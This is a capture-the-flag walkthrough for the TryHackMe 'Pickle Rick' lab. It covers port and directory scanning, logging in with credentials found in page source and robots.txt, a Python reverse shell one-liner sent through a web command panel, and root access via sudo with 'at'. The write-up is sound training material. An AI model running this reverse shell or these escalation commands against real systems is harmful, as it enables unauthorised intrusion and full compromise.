# Pickle Rick

TryHackMe room link : [Pickle Rick](https://tryhackme.com/room/picklerick)

## Nmap

`nmap -T 4 -sV 10.10.70.96`

```

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 21:24 EDT
Nmap scan report for 10.10.70.96
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.66 seconds
```

lets use gobuster for web directory scanning


## Gobuster

`gobuster dir -u http://10.10.70.96 -w /usr/share/wordlists/dirb/common.txt`

```

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.70.96
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/26 21:25:57 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/assets               (Status: 301) [Size: 311] [--> http://10.10.70.96/assets/]
/index.html           (Status: 200) [Size: 1062]                                
/robots.txt           (Status: 200) [Size: 17]                                  
/server-status        (Status: 403) [Size: 299]                                 
                                                                                
===============================================================
2021/06/26 21:28:23 Finished
===============================================================
```

lets go to `index.html`

view index.html page source code. We got a user name `R*******s`

lets view `robots.txt`

`W****************b` content of robots.txt. This might a password for user `R*******s`

__Not able to ssh login with above credentials__

Chances are that this is might be a user:password for a login page 

lets use gobuster again with different wordlist

```

cp /usr/share/wordlists/dirb/common.txt list.txt
cat list.txt | grep -v .ht > list-non-ht.txt
```

using this wordlist to check for specific php,py,sh files

```

gobuster dir -u http://10.10.70.96/ -w list-non-ht.txt  -x php,sh,py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.70.96/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                list-non-ht.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,sh,py
[+] Timeout:                 10s
===============================================================
2021/06/26 21:47:42 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 311] [--> http://10.10.70.96/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]                  
/login.php            (Status: 200) [Size: 882]                                 
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                  
/robots.txt           (Status: 200) [Size: 17]                                  
/server-status        (Status: 403) [Size: 299]                                 
                                                                                
===============================================================
2021/06/26 21:55:56 Finished
===============================================================
```

we got login.php

## login.php and portal.php

lets use credentials `R*******s : W****************b` to login 

after successfully logged in we are redirected to portal.php

lets try running some command 

` grep -R .`

scroll down to see the first ingredients

the panel in portal.php executes python3. We can use this to gain a reverse shell, go to [pentest monkey reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
and copy the python code

```

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Reverse shell

use `nc -lnvp PORT(used in above python3 code)` on your local system

After connection got established

```

nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.9.4.169] from (UNKNOWN) [10.10.70.96] 52658
/bin/sh: 0: can't access tty; job control turned off

$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

$ cd /root
/bin/sh: 2: cd: can't cd to /root
```

lets search for sudo permission that we have
```

$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-70-96.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-70-96.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

```

$ cd /home
$ ls
rick
ubuntu
$ cd rick
```

lets create an interactive shell

```

$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@ip-10-10-70-96:/home/rick$
```

lets get second ingredients
```

www-data@ip-10-10-70-96:/home/rick$ ls
ls
second ingredients
www-data@ip-10-10-70-96:/home/rick$ cat 'second ingredients'
```

lets search for file we can run
```

ww-data@ip-10-10-70-96:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core/5742/bin/mount
***************************** 
/usr/bin/at
*****************************
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```

## Privilege Escalation

use GTFOBins for at

`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null`

We can use this command to get root access

```

www-data@ip-10-10-70-96:/$ 
<    echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
warning: commands will be executed using /bin/sh
job 1 at Sun Jun 27 02:10:00 2021
/bin/sh: 0: can't access tty; job control turned off

# # whoami
whoami
root

# cd root
cd root
# ls
ls
3rd.txt  snap
# cat 3rd.txt
cat 3rd.txt
3rd ingredients: **** *****
# 
```







